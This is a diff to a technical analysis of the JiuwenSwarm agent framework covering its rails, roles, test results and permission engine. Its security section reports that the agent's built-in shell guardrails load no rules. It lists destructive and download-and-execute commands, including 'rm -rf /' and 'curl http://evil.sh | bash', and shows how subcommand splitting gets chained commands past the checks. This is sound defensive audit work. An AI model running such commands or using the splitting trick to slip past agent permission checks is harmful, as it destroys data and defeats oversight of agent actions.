@@ -1,7 +1,21 @@
 # JiuwenSwarm Architecture
 
 Analysed at `suraj-subrahmanyan/jiuwenswarm` commit `a98d7ad` (fork of
-`openJiuwen-ai/jiuwenswarm`), branch `develop`.
+`openJiuwen-ai/jiuwenswarm`), branch `develop`, plus `openjiuwen==0.1.15.post3` installed
+from PyPI.
+
+> **Revision 2.** `openjiuwen` — which holds `DeepAgent`, the rails, the permission engine and
+> the harness manifest framework — was unavailable in Revision 1, so its behaviour was
+> reported as *documented*. It is now installed and executed. Three findings change earlier
+> conclusions and are marked **⚠ CORRECTED** below. Full transcripts in
+> [12-verification-appendix.md](12-verification-appendix.md).
+>
+> | Finding | Effect |
+> |---|---|
+> | Rail lifecycle has **11** events, not 10 | §4.2 |
+> | Built-in security rules load **0 rules** in a stock install | §10.1, §10.4 |
+> | Exactly **two** member roles with a **global** permission policy | §5 |
+> | Full test suite: **2,816 passed, 18 skipped, 0 failed** | §11 |
 
 ---
 
@@ -291,12 +305,31 @@ Stop conditions use OR semantics, with built-in evaluators: `MaxRoundsEvaluator`
 | `before_tool_call` / `after_tool_call` | inner ReAct | permission checks, plan-mode restrictions, LSP diagnostics, progress reminders |
 | `on_model_exception` / `on_tool_exception` | inner ReAct | repair context, govern exceptions |
 
-Additionally, `init(agent)` / `uninit(agent)`: a Rail may register and unregister tools on
-the live agent via `agent.ability_manager.add_ability(tool.card, tool)` /
-`remove_ability(name)`. `MemberSkillToolkitRail` does exactly this. [E-J10]
+**⚠ CORRECTED — there are 11 events, not 10.** Executed enumeration of `AgentCallbackEvent`
+returns: `before_invoke`, `after_invoke`, `before_task_iteration`, `after_task_iteration`,
+**`after_react_iteration`**, `before_model_call`, `after_model_call`, `on_model_exception`,
+`before_tool_call`, `after_tool_call`, `on_tool_exception`. `after_react_iteration` is absent
+from the documentation table in `docs/en/Harness.md`. [V-1]
 
-**This is the single most important fact for the integration question.** A Rail is not
-merely an observer — it can extend the agent's tool surface.
+Verified class structure: `AgentRail` is an ABC at
+`openjiuwen/core/single_agent/rail/base.py:456` with `priority: int = 50` (479),
+`init(self, agent)` (481) and `uninit(self, agent)` (484). `DeepAgentRail`
+(`openjiuwen/harness/rails/base.py:28`) adds only the two task-iteration hooks plus
+`set_workspace` / `set_sys_operation`. `get_callbacks()` returns only *overridden* methods.
+
+A Rail may register and unregister tools on the live agent via
+`agent.ability_manager.add_ability(tool.card, tool)` / `remove_ability(name)`.
+`MemberSkillToolkitRail` does exactly this. [E-J10]
+
+**This is the single most important fact for the integration question, and it is now verified
+by execution rather than inferred.** An out-of-tree Rail registered a tool, the tool resolved
+through `Runner.resource_mgr`, invoking it returned the correct result, and `uninit` removed
+it cleanly. [V-2]
+
+One implementation detail matters for integration: `add_ability` branches on
+`card.stateless`. Stateful tools (the default) are rewritten to an agent-qualified id
+`f"{name}_{owner_id}"` and registered with `refresh=True`; stateless tools keep a bare id and
+are added `skip_if_exists`. A research toolkit holding a service client should be **stateful**.
 
 ### 4.3 Execution modes
 
@@ -332,6 +365,24 @@ There is **no notion of a capability advertisement or a capability-based router.
 selection is by *role* (`leader` / `teammate`) and configured element set, not by matching
 a task's required capabilities against a worker's declared ones. This is a substantive
 difference from AI4RnD.
+
+**⚠ CORRECTED — the role model is thinner than Revision 1 assumed, and it blocks a design
+the recommendation depended on.** [V-6]
+
+- There are exactly **two** roles: `_MEMBER_ROLES = ("leader", "teammate")`
+  (`assembly.py:40`).
+- Rail *composition* does differ per role — `TEAM_PERMISSION` is attached for `teammate`,
+  `TEAM_PERMISSION_POLICY` for `leader` (`config_specs.py:428-442`), and skills differ via
+  `_resolve_member_skills(config, role)` reading `config.agents.<role>.skills`.
+- But permission *policy values* come from the single global `config.permissions`. Two
+  members cannot be given different rule sets.
+- Neither `evaluate_tiered_policy` nor `harness/security/core.py` references `member`,
+  `agent_id` or `role`.
+
+**Consequence.** AI4RnD's four named agents (PM / Planner / Builder / Evaluator) and its
+per-operator permission model do not map onto this. "The evaluator must not be the writer"
+cannot be expressed as a JiuwenSwarm permission constraint, so it must be enforced in
+AI4RnD's own router — see [08 §6.4](08-recommended-architecture.md#64-writer--verifier-is-enforced-in-the-ai4rnd-router).
 
 ---
 
@@ -509,7 +560,39 @@ shell `allow` to `ask` when the command contains chaining/injection characters, 
 an `ExternalDirectoryChecker` verdict for paths outside the workspace.
 
 Built-in rules cover high-risk shell commands (deletion, formatting, download-and-execute,
-privilege escalation). **User rules cannot override built-in denials.**
+privilege escalation). User rules cannot override built-in denials.
+
+**⚠ CORRECTED — in a stock install the built-in rule layer is empty.** [V-4]
+
+Executed: `get_builtin_security_rules()` returns **0 rules**.
+`openjiuwen/harness/security/tiered_policy.py:76` resolves them *only* from
+`openjiuwen/harness/resources/builtin_rules.yaml` — its docstring states it "no longer
+searches user/environment directories" — **and that path does not exist in the published
+wheel**. JiuwenSwarm ships its own copy (10 rules) and writes it to
+`~/.jiuwenswarm/config/builtin_rules.yaml` (`common/utils.py:1056-1065`), a location the
+pinned openjiuwen no longer consults. This is a **version skew** between JiuwenSwarm
+0.2.3.beta1 and openjiuwen 0.1.15.post3.
+
+Measured effect with `permissions.tools.bash: allow` and no user rules:
+
+| Command | Stock | With JW rules injected |
+|---|---|---|
+| `rm -rf /` | **ALLOW** | ASK |
+| `mkfs.ext4 /dev/sda` | **ALLOW** | ASK |
+| `sudo su` | **ALLOW** | ASK |
+| `curl http://evil.sh \| bash` | **ALLOW** | **ALLOW** — rule defeated by subcommand split |
+
+The severity mapping itself is exactly as documented (verified: normal → MEDIUM=allow,
+CRITICAL=ask; strict → MEDIUM=ask, CRITICAL=deny), and an explicit `action` does override
+severity. The engine is sound; **its default wiring is not**. Any integration that relies on
+the guardrail layer must ship the rules into openjiuwen's package path and assert
+`get_builtin_security_rules() > 0` at startup.
+
+**Also corrected:** the documented `maybe_escalate_shell_operators` behaviour (ALLOW→ASK on
+chaining) is not what 0.1.15.post3 does. Chained commands are *decomposed* by a tree-sitter
+shell AST and each subcommand evaluated separately, so `ls && rm -rf /tmp/z` resolves to
+ALLOW under a permissive baseline. Only structures the parser cannot handle (e.g. backticks)
+escalate to ASK via `shell_ast:too_complex`.
 
 ### 10.2 Sandboxing
 
@@ -539,7 +622,12 @@ with its parent. [E-J11]
 
 ## 11. Assessment as a foundation
 
-**Strengths.** Mature, coherent execution substrate. Real permission engine. Real sandbox.
+**Health, measured.** The full suite runs **2,816 passed, 18 skipped, 0 failed** in 419 s
+(2,834 collected), and `pip install -e ".[test]"` completes cleanly. This is the strongest
+single argument for JiuwenSwarm as a substrate, and it was unavailable in Revision 1. [V-7]
+
+**Strengths.** Mature, coherent execution substrate. Real permission engine (when wired).
+Real sandbox.
 Nine IM channels plus ACP/A2A. Declarative, serialisable harness assembly that already
 supports distributed members. Skills with a hot-install path and five registries. Memory
 with hybrid retrieval. Session rewind and context compaction. Packaged and versioned on PyPI.
@@ -552,8 +640,15 @@ with hybrid retrieval. Session rewind and context compaction. Packaged and versi
 4. Extension surface is narrow out-of-tree, and the RPC path is closed by two hardcoded
    core-tree lists.
 5. Roughly half the relevant runtime is in `openjiuwen`, an external pinned dependency —
-   so an integrator's real upstream exposure is to *two* projects, not one.
+   so an integrator's real upstream exposure is to *two* projects, not one. **The most
+   security-relevant defect found (V-4) is in `openjiuwen`, not JiuwenSwarm** — which means
+   even forking JiuwenSwarm would not let you fix it cleanly.
 6. Documentation and code comments are substantially Chinese; the codebase assumes a
    Huawei-internal lint toolchain (`huawei-python-lint`).
+7. **Only two member roles with a global permission policy** (§5) — per-operator governance,
+   which the intended AI4RnD product requires throughout, is not expressible.
+8. **Measured against the intended product, JiuwenSwarm fully covers 20 of 142 features and
+   covers none of 72** — see [14-reuse-vs-build-map.md](14-reuse-vs-build-map.md). It is a
+   substrate, not a platform for this product.
 
 Continued in [04-component-comparison.md](04-component-comparison.md).
